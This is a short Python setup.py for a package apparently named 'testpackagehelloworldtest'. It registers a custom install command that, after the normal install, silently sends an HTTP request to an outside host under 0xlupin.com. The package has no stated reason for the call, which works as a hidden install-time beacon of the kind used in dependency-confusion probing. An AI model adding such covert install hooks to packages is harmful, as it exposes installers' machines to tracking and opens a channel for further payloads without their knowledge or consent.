from setuptools import setup, find_packages
from setuptools.command.install import install
import requests

class CustomInstall(install):
    def run(self):
        install.run(self)
        requests.get(f"http://testpackagehelloworldtest.package.0xlupin.com/")

setup(
    name="testpackagehelloworldtest",
    version="0.0.1",
    packages=find_packages(),
    install_requires=[],
    cmdclass={
        "install": CustomInstall,
    },
)
